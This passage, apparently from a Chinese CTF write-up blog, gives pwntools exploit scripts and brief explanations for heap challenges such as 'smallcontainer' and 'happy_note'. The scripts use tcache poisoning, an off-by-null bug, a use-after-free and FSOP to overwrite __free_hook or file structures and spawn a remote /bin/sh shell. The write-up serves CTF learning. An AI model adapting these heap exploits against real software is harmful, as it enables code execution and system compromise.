class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(mode))<br>    p.sendafter(<span class="hljs-string">&#x27;gift!&#x27;</span>,data)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">back</span>(<span class="hljs-params">ind,off</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;much?&#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p,gadget</span>):<br>    libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>))<br>        <span class="hljs-comment">#0~3 0x110</span><br>    add(<span class="hljs-number">1</span>) <span class="hljs-comment">#4</span><br><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">2</span>)<br><br>    show(<span class="hljs-number">2</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;cost: &#x27;</span>)<br>    heap_1=<span class="hljs-built_in">int</span>(p.readline())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_1))<br>    back(<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>*(<span class="hljs-number">0x120</span>))<br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">3</span>)<br><br>    free(<span class="hljs-number">0</span>)<br>    show(<span class="hljs-number">0</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;cost: &#x27;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline())<br>    malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>    libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    system=libc.address+gadget<br>    free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><br>    add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#6</span><br>    add(<span class="hljs-number">1</span>,p64(free_hook-<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#7</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">1</span>,p64(system)) <span class="hljs-comment">#9</span><br><br>    free(<span class="hljs-number">6</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]:<br>    <span class="hljs-keyword">try</span>:<br>        p=remote(<span class="hljs-string">&#x27;182.92.74.66 21469&#x27;</span>)<br>        pwn(p,i)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="smallcontainer">smallcontainer</h2><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer.jpg" srcset="/img/loading.gif" lazyload alt="add" title="add"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-1.jpg" srcset="/img/loading.gif" lazyload alt="delete" title="delete"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-2.jpg" srcset="/img/loading.gif" lazyload alt="edit" title="edit"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-3.jpg" srcset="/img/loading.gif" lazyload alt="check" title="check"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-4.jpg" srcset="/img/loading.gif" lazyload alt="show" title="show"></p><p>问题出在check函数中，<code>check</code>函数会检测被修改的<code>chunk</code>的数据，直到某个字节为<code>0</code>，这导致如果<code>curr_chunk</code>的<code>data</code>的每个字节都不为<code>0</code>，且<code>next_chunk</code>的<code>size段</code>的第一个字节为<code>0x11</code>时，程序会设置<code>next_chunk</code>的<code>size段</code>的第一个字节为<code>0x00</code>，这样可以把<code>next_chunk</code>的<code>inuse</code>为设置为0，表示了当前<code>chunk</code>是被释放的<code>chunk</code>，如果能够把<code>next_chunk</code>放入<code>unsorted bin</code>，程序就会将<code>curr_chunk</code>与<code>next_chunk</code>合并，虽然当前chunk没有被释放<br>如果我们在从<code>unsorted bin</code>中获取到<code>chunk</code>，则在<code>heappp数组</code>中就会存在两个指向同一<code>chunk</code>的指针,这样就可以利用<code>tcache bin attack</code>，在<code>free_hook</code>中写入<code>system</code>函数地址，执行<code>system(&quot;/bin/sh&quot;);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data=<span class="hljs-string">&#x27; &#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;This&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;123.56.121.45&#x27;</span>,<span class="hljs-string">&#x27;24258&#x27;</span>)<br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#9</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#10</span><br><br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#0 #1</span><br><br>heap_0=show(<span class="hljs-number">0</span>)-<span class="hljs-number">0x10</span><br>heap_1=heap_0+<span class="hljs-number">0x200</span><br>heap_2=heap_1+<span class="hljs-number">0x200</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">6</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">7</span>) <span class="hljs-comment">#4 </span><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">9</span>) <span class="hljs-comment">#6</span><br>free(<span class="hljs-number">10</span>) <span class="hljs-comment">#7</span><br><br>edit(<span class="hljs-number">0</span>,p64(heap_2)+p64(heap_2))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x1f0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)<br>edit(<span class="hljs-number">3</span>,payload)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>payload=p64(heap_1)*<span class="hljs-number">2</span><br>payload=payload.ljust(<span class="hljs-number">0x1f0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">0x200</span>)<br>edit(<span class="hljs-number">2</span>,payload)<br><span class="hljs-comment">#pause()</span><br>free(<span class="hljs-number">3</span>)<br><br>malloc_hook=show(<span class="hljs-number">2</span>)-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x1f8</span>)<br>    <span class="hljs-comment">#0 3 5 6 7 8 9</span><br><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment"># 10</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">10</span>,p64(free_hook))<br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">2</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="happy-note">happy_note</h2><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-5.jpg" srcset="/img/loading.gif" lazyload alt="main" title="main"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note.jpg" srcset="/img/loading.gif" lazyload alt="delete_one" title="delete_one"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-1.jpg" srcset="/img/loading.gif" lazyload alt="edit" title="edit"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-2.jpg" srcset="/img/loading.gif" lazyload alt="show" title="show"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-3.jpg" srcset="/img/loading.gif" lazyload alt="create" title="create"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-4.jpg" srcset="/img/loading.gif" lazyload alt="delete" title="delete"></p><p>程序允许用户执行一次<code>uaf</code>，并且允许用户从<code>tcache bin</code>中获取两次<code>chunk</code>，那么重点就是这唯一一次<code>uaf</code>如何使用，我的想法是用于泄露<code>chunk地址</code>和<code>libc地址</code>，并用于修改<code>small bin</code>中<code>chunk</code>的<code>bk字段</code>为某个<code>tcache bin</code>的地址，<code>tcache bin</code>的地址可以通过<code>chunk</code>的地址进行计算,<code>small bin</code>中<code>chunk</code>逆序进入<code>tcache bin</code>,这时当前<code>tcache bin</code>的第一个成员就为某一个<code>tcache bin</code>的地址，当我们在<code>tcache bin</code>的地址创建一个<code>chunk</code>，并修改<code>tcache bin</code>的内容，就可以在一个任意地址创建<code>chunk</code>，进行任意读写,因为libc2.34中删除了<code>malloc_hook</code>,<code>free_hook</code>，所以我们只能利用<code>IO</code>调用<code>system函数</code>或<code>one_gadget</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,ind,mode=<span class="hljs-number">1</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;[2]&#x27;</span>,<span class="hljs-built_in">str</span>(mode))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind,mode=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">if</span> mode:<br>        p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    <span class="hljs-keyword">else</span>:<br>        p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;show?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p</span>):<br><br>    libc=ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>,checksec=<span class="hljs-number">0</span>)<br>    ld=ELF(<span class="hljs-string">&#x27;ld-2.34.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x98</span>,i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        free(i)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0xa8</span>,i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0x148</span>,i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br><br>    add(<span class="hljs-number">0x158</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">1</span>)<br><br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">0</span>)<br><br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">5</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">6</span>)<br>    free(<span class="hljs-number">5</span>)<br>    free(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)  <span class="hljs-comment">#6 = addr</span><br><br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">4</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">5</span>)<br>    free(<span class="hljs-number">4</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">4</span>)<br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">7</span>)<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        利用chunk分裂，将0xa0大小的chunk放入small bin</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>    show(<span class="hljs-number">6</span>)<br><br>    p.readuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>    smallb_2=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(smallb_2))<br>    tcache_150=(smallb_2-<span class="hljs-number">0x150</span>*<span class="hljs-number">7</span>-<span class="hljs-number">0xb0</span>*<span class="hljs-number">7</span>-<span class="hljs-number">0xa0</span>*<span class="hljs-number">4</span>-<span class="hljs-number">0x150</span>-<span class="hljs-number">0xb0</span>-<span class="hljs-number">0xb0</span>)&amp;<span class="hljs-number">0xfffffffffffff000</span><br>    tcache_150+=<span class="hljs-number">0x128</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_150))<br>    gadget_back=smallb_2+<span class="hljs-number">0xa0</span>+<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x150</span>+<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x10</span><br>    gadget_back1=gadget_back+<span class="hljs-number">0x150</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>    show(<span class="hljs-number">6</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>    d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>    stdin=d-<span class="hljs-number">0x200</span>-<span class="hljs-number">208</span><br>    libc.address=stdin-libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br><br>    stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stdout))<br><br>    edit(<span class="hljs-number">6</span>,p64(smallb_2)+p64(tcache_150-<span class="hljs-number">0x18</span>))<br>    <br>    add(<span class="hljs-number">0x98</span>,<span class="hljs-number">8</span>)<br>    add(<span class="hljs-number">0x98</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">9</span>,p64(stdout)*<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)<br><br>    system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    io_lock=libc.address+<span class="hljs-number">2210384</span><br>    io_wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br><br>    fake_IO=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>    fake_IO+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>    fake_IO+=p64(system)+p64(system+<span class="hljs-number">1</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span><br>    fake_IO+=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)+p64(io_lock)<br>    fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0</span>)<br>    fake_IO+=p64(stdout+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)*<span 